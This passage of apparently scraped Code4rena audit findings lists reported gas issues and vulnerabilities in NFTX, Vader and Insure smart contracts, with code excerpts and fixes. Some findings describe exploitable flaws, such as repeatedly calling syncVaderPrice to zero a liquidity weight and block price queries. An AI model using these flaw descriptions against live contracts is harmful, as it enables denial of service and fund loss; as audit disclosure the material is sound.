(Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  robee   # Vulnerability details  In the following files there are contract imports that aren't used.  Import of unnecessary files costs deployment gas (and is a bad coding practice that is important to ignore).  The following is a full list of all unused imports, we went through the whole code to find it :) <solidity file> <line number> <actual import line>:           IPrevNftxContract.sol, line 4, import \"./IERC165Upgradeable.sol\";         NFTXEligibilityManager.sol, line 5, import \"./interface/INFTXVaultFactory.sol\";         NFTXInventoryStaking.sol, line 6, import \"./interface/INFTXFeeDistributor.sol\";         NFTXInventoryStaking.sol, line 10, import \"./token/IERC721Upgradeable.sol\";         NFTXInventoryStaking.sol, line 11, import \"./token/IERC1155Upgradeable.sol\";         NFTXInventoryStaking.sol, line 16, import \"./proxy/Initializable.sol\";         NFTXLPStaking.sol, line 5, import \"./interface/INFTXFeeDistributor.sol\";         NFTXLPStaking.sol, line 12, import \"./proxy/Initializable.sol\";         NFTXMarketplaceZap.sol, line 8, import \"./interface/ITimelockRewardDistributionToken.sol\";         NFTXMarketplaceZap.sol, line 10, import \"./testing/IERC721.sol\";         NFTXMarketplaceZap.sol, line 15, import \"./util/OwnableUpgradeable.sol\";         NFTXSimpleFeeDistributor.sol, line 10, import \"./util/SafeMathUpgradeable.sol\";         NFTXStakingZap.sol, line 9, import \"./interface/ITimelockRewardDistributionToken.sol\";         NFTXStakingZap.sol, line 11, import \"./testing/IERC721.sol\";         NFTXStakingZap.sol, line 16, import \"./util/OwnableUpgradeable.sol\";         NFTXVaultFactoryUpgradeable.sol, line 5, import \"./interface/INFTXLPStaking.sol\";         NFTXVaultFactoryUpgradeable.sol, line 7, import \"./proxy/ClonesUpgradeable.sol\";         NFTXVaultUpgradeable.sol, line 8, import \"./interface/INFTXLPStaking.sol\";         NFTXVaultUpgradeable.sol, line 10, import \"./interface/IERC165Upgradeable.sol\";         PalmNFTXStakingZap.sol, line 15, import \"../util/OwnableUpgradeable.sol\";         StakingTokenProvider.sol, line 7, import \"./token/IERC20Upgradeable.sol\";         ERC20FlashMintUpgradeable.sol, line 4, import \"../interface/IERC3156Upgradeable.sol\";         RewardDistributionTokenUpgradeable.sol, line 5, import \"../interface/IRewardDistributionToken.sol\";         RewardDistributionTokenUpgradeable.sol, line 11, import \"hardhat/console.sol\";         TimelockRewardDistributionTokenImpl.sol, line 5, import \"../interface/IRewardDistributionToken.sol\";         NFTXFlashSwipe.sol, line 4, import \"../interface/IERC3156Upgradeable.sol\";         PausableUpgradeable.sol, line 5, import \"./SafeMathUpgradeable.sol\";    "}, {"title": "buyAndSwap1155WETH() function may cause loss of user assets", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/2", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  In the NFTXMarketplaceZap.sol contract, the buyAndSwap1155WETH function uses the WETH provided by the user to exchange VaultToken, but when executing the _buyVaultToken method, msg.value is used instead of maxWethIn. Since msg.value is 0, the call will fail.  ``` function buyAndSwap1155WETH(   uint256 vaultId,   uint256[] memory idsIn,   uint256[] memory amounts,   uint256[] memory specificIds,   uint256 maxWethIn,   address[] calldata path,   address to ) public payable nonReentrant {   require(to != address(0));   require(idsIn.length != 0);   IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);   uint256 count;   for (uint256 i = 0; i <idsIn.length; i++) {       uint256 amount = amounts[i];       require(amount> 0, \"Transferring <1\");       count += amount;   }   INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));   uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (       vault.randomSwapFee() * (count-specificIds.length)   );   uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path); ```  In extreme cases, when the user provides both ETH and WETH (the user approves the contract WETH in advance and calls the buyAndSwap1155WETH function instead of the buyAndSwap1155 function by mistake), the _buyVaultToken function will execute successfully, but because the buyAndSwap1155WETH function will not convert ETH to WETH, The user\u2019s ETH will be locked in the contract, causing loss of user assets.  ```    function _buyVaultToken(      address vault,      uint256 minTokenOut,      uint256 maxWethIn,      address[] calldata path    ) internal returns (uint256[] memory) {      uint256[] memory amounts = sushiRouter.swapTokensForExactTokens(        minTokenOut,        maxWethIn,        path,        address(this),        block.timestamp      );       return amounts;    } ```   ## Tools Used  Manual audit  ## Recommended Mitigation Steps   ``` - uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path); + uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path); ```  "}, {"title": "_addUSDVPair can also update", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/185", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function _addUSDVPair does not check if the foreignAsset does not exist yet, thus it is possible to override it.   ## Recommended Mitigation Steps Make sure this is the intended behavior or else add validations, e.g. ```solidity   require(pairData.updatePeriod == 0, \"...\"); ```  "}, {"title": "Adding pair of the same `foreignAsset` would replace oracle of earlier entry", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/160", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Oracles are mapped to the `foreignAsset` but not to the specific pair. Pairs with the same `foreignAsset` (e.g. UniswapV2 and Sushi) will be forced to use the same oracle. Generally this should be the expected behavior but there are also possibility that while adding a new pair changed the oracle of an older pair unexpectedly.  ## Proof of Concept https://github.com/code-423n4/2021-12-vader/blob/9fb7f206eaff1863aeeb8f997e0f21ea74e78b49/contracts/lbt/LiquidityBasedTWAP.sol#L271 ```         oracles[foreignAsset] = oracle; ```  ## Recommended Mitigation Steps Bind the oracle to pair instead  "}, {"title": "Vader TWAP averages wrong", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/148", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  cmichel   # Vulnerability details  The vader price in `LiquidityBasedTWAP.getVaderPrice` is computed using the `pastLiquidityWeights` and `pastTotalLiquidityWeight` return values of the `syncVaderPrice`.  The `syncVaderPrice` function does not initialize all weights and the total liquidity weight does not equal the sum of the individual weights because it skips initializing the pair with the previous data if the TWAP update window has not been reached yet:  ```solidity function syncVaderPrice()     public     override     returns (         uint256[] memory pastLiquidityWeights,         uint256 pastTotalLiquidityWeight     ) {     uint256 _totalLiquidityWeight;     uint256 totalPairs = vaderPairs.length;     pastLiquidityWeights = new uint256[](totalPairs);     pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];      for (uint256 i; i < totalPairs; ++i) {         IUniswapV2Pair pair = vaderPairs[i];         ExchangePair storage pairData = twapData[address(pair)];         // @audit-info lastMeasurement is set in _updateVaderPrice to block.timestamp         uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;         // @audit-info update period depends on pair         // @audit-issue if update period not reached => does not initialize pastLiquidityWeights[i]         if (timeElapsed < pairData.updatePeriod) continue;          uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;         uint256 currentLiquidityEvaluation = _updateVaderPrice(             pair,             pairData,             timeElapsed         );          pastLiquidityWeights[i] = pastLiquidityEvaluation;          pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;          _totalLiquidityWeight += currentLiquidityEvaluation;     }      totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight; } ```  #### POC This bug leads to several different issues. A big one is that an attacker can break the price functions and make them revert. Observe what happens if an attacker calls `syncVaderPrice` twice in the same block:  - The first time any pairs that need to be updated are updated - On the second call `_totalLiquidityWeight` is initialized to zero and all pairs have already been updated and thus skipped. `_totalLiquidityWeight` never increases and the storage variable `totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight = 0;` is set to zero. - DoS because calls to `getStaleVaderPrice` / `getVaderPrice` will revert in `_calculateVaderPrice` which divides by `totalLiquidityWeight = 0`.  Attacker keeps double-calling `syncVaderPrice` every time an update window of one of the pairs becomes eligible to be updated.   ## Impact This bug leads to using wrong averaging and ignoring entire pairs due to their weights being initialized to zero and never being changed if the update window is not met. This in turn makes it easier to manipulate the price as potentially only a single pair needs to be price-manipulated.  It's also possible to always set the `totalLiquidityWeight` to zero by calling `syncVaderPrice` twice which in turn reverts all transactions making use of the price because of a division by zero in `_caluclateVaderPrice`. An attacker can break the `USDV.mint` minting forever and any router calls to `VaderReserve.reimburseImpermanentLoss` also fail as they perform a call to the reverting price function.  ## Recommended Mitigation Steps Even if `timeElapsed < pairData.updatePeriod`, the old pair weight should still contribute to the total liquidity weight and be set in `pastLiquidityWeights`. Move the `_totalLiquidityWeight += currentLiquidityEvaluation` and the `pastLiquidityWeights[i] = pastLiquidityEvaluation` assignments before the `continue`.   "}, {"title": "vader can be initialized twice", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/139", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L221 vader can be initialized twice if in the first call to `setupVader`, `vaderPrice == 0`.  ## Recommended Mitigation Steps add: ``` require(vaderPrice > 0); ``` in `setupVader`.  "}, {"title": "`totalLiquidityWeight` Is Updated When Adding New Token Pairs Which Skews Price Data For `getVaderPrice` and `getUSDVPrice`", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/105", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `_addVaderPair` function is called by the `onlyOwner` role. The relevant data in the `twapData` mapping is set by querying the respective liquidity pool and Chainlink oracle. `totalLiquidityWeight` for the `VADER` path is also incremented by the `pairLiquidityEvaluation` amount (calculated within `_addVaderPair`). If a user then calls `syncVaderPrice`, the recently updated `totalLiquidityWeight` will be taken into consideration when iterating through all token pairs eligible for price updates to calculate the liquidity weight for each token pair. This data is stored in `pastTotalLiquidityWeight` and `pastLiquidityWeights` respectively.  As a result, newly added token pairs will increase `pastTotalLiquidityWeight` while leaving `pastLiquidityWeights` underrepresented. This only occurs if `syncVaderPrice` is called before the update period for the new token has not been passed.  This issue also affects how the price for `USDV` is synced.  ## Proof of Concept  https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L299 ``` function _addVaderPair(     IUniswapV2Pair pair,     IAggregatorV3 oracle,     uint256 updatePeriod ) internal {     require(         updatePeriod != 0,         \"LBTWAP::addVaderPair: Incorrect Update Period\"     );      require(oracle.decimals() == 8, \"LBTWAP::addVaderPair: Non-USD Oracle\");      ExchangePair storage pairData = twapData[address(pair)];      bool isFirst = pair.token0() == vader;      (address nativeAsset, address foreignAsset) = isFirst         ? (pair.token0(), pair.token1())         : (pair.token1(), pair.token0());      oracles[foreignAsset] = oracle;      require(nativeAsset == vader, \"LBTWAP::addVaderPair: Unsupported Pair\");      pairData.foreignAsset = foreignAsset;     pairData.foreignUnit = uint96(         10**uint256(IERC20Metadata(foreignAsset).decimals())     );      pairData.updatePeriod = updatePeriod;     pairData.lastMeasurement = block.timestamp;      pairData.nativeTokenPriceCumulative = isFirst         ? pair.price0CumulativeLast()         : pair.price1CumulativeLast();      (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();      (uint256 reserveNative, uint256 reserveForeign) = isFirst         ? (reserve0, reserve1)         : (reserve1, reserve0);      uint256 pairLiquidityEvaluation = (reserveNative *         previousPrices[uint256(Paths.VADER)]) +         (reserveForeign * getChainlinkPrice(foreignAsset));      pairData.pastLiquidityEvaluation = pairLiquidityEvaluation;      totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;      vaderPairs.push(pair);      if (maxUpdateWindow < updatePeriod) maxUpdateWindow = updatePeriod; } ```  https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L113-L148 ``` function syncVaderPrice()     public     override     returns (         uint256[] memory pastLiquidityWeights,         uint256 pastTotalLiquidityWeight     ) {     uint256 _totalLiquidityWeight;     uint256 totalPairs = vaderPairs.length;     pastLiquidityWeights = new uint256[](totalPairs);     pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];      for (uint256 i; i < totalPairs; ++i) {         IUniswapV2Pair pair = vaderPairs[i];         ExchangePair storage pairData = twapData[address(pair)];         uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;          if (timeElapsed < pairData.updatePeriod) continue;          uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;         uint256 currentLiquidityEvaluation = _updateVaderPrice(             pair,             pairData,             timeElapsed         );          pastLiquidityWeights[i] = pastLiquidityEvaluation;          pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;          _totalLiquidityWeight += currentLiquidityEvaluation;     }      totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight; } ```  As shown above, `pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)]` loads in the total liquidity weight which is updated when `_addVaderPair` is called. However, `pastLiquidityWeights` is calculated by iterating through each token pair that is eligible to be updated.  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider removing the line `totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;` in `_addVaderPair` so that newly added tokens do not impact upcoming queries for `VADER/USDV` price data. This should ensure `syncVaderPrice` and `syncUSDVPrice` cannot be manipulated when adding new tokens.  "}, {"title": "Oracle returns an improperly scaled USDV/VADER price", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/70", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Invalid values returned from oracle in vast majority of situations  ## Proof of Concept  The LBT oracle does not properly scale values when calculating prices for VADER or USDV. To show this we consider the simplest case where we expect USDV to return a value of $1 and show that the oracle does not return this value.  Consider the case of the LBT oracle tracking a single USDV-DAI pair where USDV trades 1:1 for DAI and Chainlink reports that DAI is exactly $1. We then work through the lines linked below:  https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409  For L397 we get a value of 1e8 as Chainlink reports the price of DAI with 8 decimals of accuracy. ``` foreignPrice = getChainlinkPrice(address(foreignAsset)); foreignPrice = 1e8 ```  We can set `liquidityWeights[i]` and `totalUSDVLiquidityWeight` both to 1 as we only consider a single pair so L399-401 becomes ``` totalUSD = foreignPrice; totalUSD = 1e8; ```  L403-408 is slightly more complex but from looking at the links below we can calculate `totalUSDV` as shown https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/dex-v2/pool/VaderPoolV2.sol#L81-L90 https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/external/libraries/FixedPoint.sol#L137-L160  ``` totalUSDV = pairData     .nativeTokenPriceAverage     .mul(pairData.foreignUnit)     .decode144() // pairData.nativeTokenPriceAverage == 2**112 // pairData.foreignUnit = 10**18 // decode144(x) = x >> 112 totalUSDV = (2**112).mul(10**18).decode144() totalUSDV = 10**18 ```  Using `totalUSD` and `totalUSDV` we can then calculate the return value of `_calculateUSDVPrice`  ``` returnValue = (totalUSD * 1 ether) / totalUSDV;  returnValue = 1e8 * 1e18 / 1e18  returnValue = 1e8 ```  For the oracle implementation to be correct we then expect that the Vader protocol to treat values of 1e8 from the oracle to mean USDV is worth $1. However from the lines of code linked below we can safely assume that it is intended to be that values of 1e18 represent $1 rather than 1e8.  https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L76 https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L109  High severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.  ## Recommended Mitigation Steps  Go over oracle calculation again to ensure that various scale factors are properly accounted for. Some handling of the difference in the number of decimals between the chainlink oracle and the foreign asset should be added.  Build a test suite to ensure that the oracle returns the expected values for simple situations.  "}, {"title": "Gas: Avoid expensive calculation by checking if `originalLiquidity() == 0`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/361", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Checking if the value is 0 before returning 0 is less expensive than returning a calculation that's equal to 0  ## Proof of Concept In `PoolTemplate.sol:rate()`, the code is as follows: ``` File: PoolTemplate.sol 744:     function rate() external view returns (uint256) { 745:         if (totalSupply() > 0) { 746:             return (originalLiquidity() * MAGIC_SCALE_1E6) / totalSupply(); 747:         } else { 748:             return 0; 749:         } 750:     }  ``` It can be optimized as such: ``` 744:     function rate() external view returns (uint256) { 745:         uint256 originalLiquidity = originalLiquidity(); 746:         if (originalLiquidity != 0 && totalSupply() > 0) { 747:             return (originalLiquidity * MAGIC_SCALE_1E6) / totalSupply(); 748:         } else { 749:             return 0; 750:         } 751:     }  ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache the loaded storage value in a memory variable and make the 0 checks to avoid unnecessary calculations if `originalLiquidity() == 0`  "}, {"title": "Gas: Optimize Conditional Statements in `PoolTemplate.sol:worth()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/355", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact It's possible to save gas by optimizing the checks in conditional statements (`if`, `else if` and `else`). This would save a few opcodes and avoid redundant checks.  ## Proof of Concept In `PoolTemplate.sol:worth()`, the code is as follows: ``` 799:     function worth(uint256 _value) public view returns (uint256 _amount) { 800:         uint256 _supply = totalSupply(); 801:         uint256 _originalLiquidity = originalLiquidity(); 802:         if (_supply > 0 && _originalLiquidity > 0) { 803:             _amount = (_value * _supply) / _originalLiquidity; 804:         } else if (_supply > 0 && _originalLiquidity == 0) { 805:             _amount = _value * _supply; 806:         } else { 807:             _amount = _value; 808:         } 809:     } ```  The conditions checks can be optimized with the following (read the `@audit-info` comments for further information): ```     function worth(uint256 _value) public view returns (uint256 _amount) {         uint256 _supply = totalSupply();         uint256 _originalLiquidity = originalLiquidity();         if (_supply == 0) {             _amount = _value;         } else if (_originalLiquidity == 0) {             _amount = _value * _supply;         } else {             _amount = (_value * _supply) / _originalLiquidity;         }     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Compact conditions in mentioned logic statements   "}, {"title": "Index compensate is 0 when totalLiquidity() is enough to cover the whole amount", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/354", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact In IndexTemplate, function compensate, When _amount > _value, and <= totalLiquidity(), the value of _compensated is not set, so it gets a default value of 0: ```solidity if (_value >= _amount) {     ...     _compensated = _amount; } else {     ...     if (totalLiquidity() < _amount) {         ...         _compensated = _value + _cds;     }     vault.offsetDebt(_compensated, msg.sender); } ```  But nevertheless, in both cases, it calls vault.offsetDebt, even when the _compensated is 0 (no else block).  ## Recommended Mitigation Steps I think, in this case, it should try to redeem the premium (withdrawCredit?) to cover the whole amount, but I am not sure about the intentions as I didn't have enough time to understand this protocol in depth.  "}, {"title": "Unbounded iteration over all indexes (2)", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/352", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact The transactions could fail if the array get too big and the transaction would consume more gas than the block limit. This will then result in a denial of service for the desired functionality and break core functionality.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L703  ## Tools Used VS Code  ## Recommended Mitigation Steps Keep the array size small.  "}, {"title": "Gas: `incident.payoutDenominator` is used only once. It shouldn't be stored in a variable.", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/350", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (1 MSTORE and 1 MLOAD)  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L553 There's no readability or gas gain from copying `incident.payoutDenominator` to a variable as it's used only once in the method.  ## Tools Used VS Code  ## Recommended Mitigation Steps Do not store this data in a variable  "}, {"title": "Gas: `incident.payoutNumerator` is used only once. It shouldn't be stored in a variable.", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/349", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (1 MSTORE and 1 MLOAD)  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L552 There's no readability or gas gain from copying `incident.payoutNumerator` to a variable as it's used only once in the method.  ## Tools Used VS Code  ## Recommended Mitigation Steps Do not store this data in a variable  "}, {"title": "Gas: Avoid expensive calculation by checking if `valueAll() == 0`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/344", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Checking if the value is 0 before returning 0 is less expensive than returning a calculation that's equal to 0  ## Proof of Concept In `Vault.sol:underlyingValue()`, the code is as follows: ``` Vault.sol 400:     function underlyingValue(address _target) 401:         public 402:         view 403:         override 404:         returns (uint256) 405:     { 406:         if (attributions[_target] > 0) { 407:             return (valueAll() * attributions[_target]) / totalAttributions; 408:         } else { 409:             return 0; 410:         } 411:     } ``` It can be optimized as such:  ``` 406:         uint256 valueAll = valueAll(); 407:         if (valueAll != 0 && attributions[_target] > 0) { 408:             return (valueAll * attributions[_target]) / totalAttributions; 409:         } else { 410:             return 0; 411:         } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache the loaded storage value in a memory variable and make the 0 checks to avoid unnecessary calculations if `valueAll() == 0`  "}, {"title": "Gas: Cache `attributions[_target]` in `Vault.sol:underlyingValue()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/343", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact SLOADs are expensive  ## Proof of Concept Here, `attributions[_target]` can be loaded twice from storage: ``` Vault.sol 400:     function underlyingValue(address _target) 401:         public 402:         view 403:         override 404:         returns (uint256) 405:     { 406:         if (attributions[_target] > 0) { 407:             return (valueAll() * attributions[_target]) / totalAttributions; 408:         } else { 409:             return 0; 410:         } 411:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache the loaded storage value in a memory variable  "}, {"title": "Misleading comments and documentation", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/337", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact There are some issues with comments/documentation, e.g.: Misleading comment: ```solidity    * @return true if the id within the market already exists   function getCDS(address _address) external view override returns (address) ``` No such function (present in documentation): ```solidity   function getInsuranceCount(address _user) ``` \"getInsuranceCount returns how many insurance policies the specified user has.\"  ## Recommended Mitigation Steps Consider revisiting and updating discrepancies between the documentation and comments.  "}, {"title": "Ordering importance in a struct", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/334", "labels": ["bug", "help wanted", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Kumpirmafyas   # Vulnerability details  ## Impact The order of the \"struct Template\" in the Factory.sol contract is as follows: 1-bool isOpen 2-bool approval 3-bool allowDuplicate https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L44-L48   The struct above is used in functions as value, in the \"key=>value\" part in this mapping. https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L49  When using \"template\" mapping in this function, it is not done in the defined order, Detail: - isOpen bool , defined in Struct in the 1st row, -isOpen bool ,defined in the 1st position in Mapping, naturally -isOpen bool is defined in the 2nd row in the \"approveTemplate\" function below. -The same applies to the approvel bool struct.  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L101-L103   The problem here is; The order in which Structs are used in a Function is not. Problem ; The order of the structs in the \"key => value\" mapping definition affects the function. Sequencing is important in struct definition in mappings.   ## Recommended Mitigation Steps The order in the struct = the order in the mapping = the order in the function must be the same.  Here ; Sorting in Mapping with Struct is a mandatory condition, while sorting in a function is within the scope of clean code.  "}, {"title": "Order of statements", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/332", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Statements should be ordered in a way that it costs less gas, that is, less operations are performed when the validating conditions are wrong. e.g. this can be reordered: ```solidity   //Distribute premium and fee   uint256 _endTime = _span + block.timestamp;   uint256 _premium = getPremium(_amount, _span);   uint256 _fee = parameters.getFeeRate(msg.sender);    require(       _amount <= availableBalance(),       \"ERROR: INSURE_EXCEEDED_AVAILABLE_BALANCE\"   );   require(_premium <= _maxCost, \"ERROR: INSURE_EXCEEDED_MAX_COST\");   require(_span <= 365 days, \"ERROR: INSURE_EXCEEDED_MAX_SPAN\");   require(       parameters.getMinDate(msg.sender) <= _span,       \"ERROR: INSURE_SPAN_BELOW_MIN\"   );    require(       marketStatus == MarketStatus.Trading,       \"ERROR: INSURE_MARKET_PENDING\"   );   require(paused == false, \"ERROR: INSURE_MARKET_PAUSED\"); ``` to something like this: ```solidity   require(paused == false, \"ERROR: INSURE_MARKET_PAUSED\");   require(       marketStatus == MarketStatus.Trading,       \"ERROR: INSURE_MARKET_PENDING\"   );    require(       _amount <= availableBalance(),       \"ERROR: INSURE_EXCEEDED_AVAILABLE_BALANCE\"   );    require(_span <= 365 days, \"ERROR: INSURE_EXCEEDED_MAX_SPAN\");   require(       parameters.getMinDate(msg.sender) <= _span,       \"ERROR: INSURE_SPAN_BELOW_MIN\"   );    //Distribute premium and fee   uint256 _premium = getPremium(_amount, _span);   require(_premium <= _maxCost, \"ERROR: INSURE_EXCEEDED_MAX_COST\");    uint256 _endTime = _span + block.timestamp;   uint256 _fee = parameters.getFeeRate(msg.sender); ```  "}, {"title": "Gas: Cache `_fee[_target]` in `Parameters.sol:getFeeRate()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/320", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact SLOADs are expensive  ## Proof of Concept Here, `_fee[_target]` can be loaded twice from storage: ``` 271:     function getFeeRate(address _target) 272:         external 273:         view 274:         override 275:         returns (uint256) 276:     { 277:         if (_fee[_target] == 0) { 278:             return _fee[address(0)]; 279:         } else { 280:             return _fee[_target]; 281:         } 282:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache the storage reading in a memory variable  "}, {"title": "Gas Optimization: Use unchecked for safe math", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/317", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Use unchecked for safe math to save gas, for example: https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PremiumModels/BondingPremium.sol#L176 ```         premiumRate = premiumRate / T_1 / (u1 - u2) / BASE; ``` Since we have 1) T_1 != 0 (L229) 2) (u1 - u2) != 0 (L126-132) 3) BASE != 0 (L28) we can safely wrap this line in an unchecked block  "}, {"title": "Validate _to is not empty", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/314", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact _withdrawAttribution should validate that _to is not an empty address 0x0 to prevent accidental burns. Similarly, transferValue _destination param and withdrawValue _to param should also be checked against an empty address unless this is the intended functionality in some cases.  ## Recommended Mitigation Steps require _to != address(0)  "}, {"title": "`targetLev` can be set to 0 in `IndexTemplate:setLeverage`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/311", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact  Division by 0 or functionally incorrect `targetLev`  ## POC A division by `targetLev` is made here : https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L306 and `targetLev` can be set to 0 : https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L575  ## Tools Used VS Code  ## Recommended Mitigation Steps Either make a check on `targetLev` before setting it here: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L575 or make a check before the 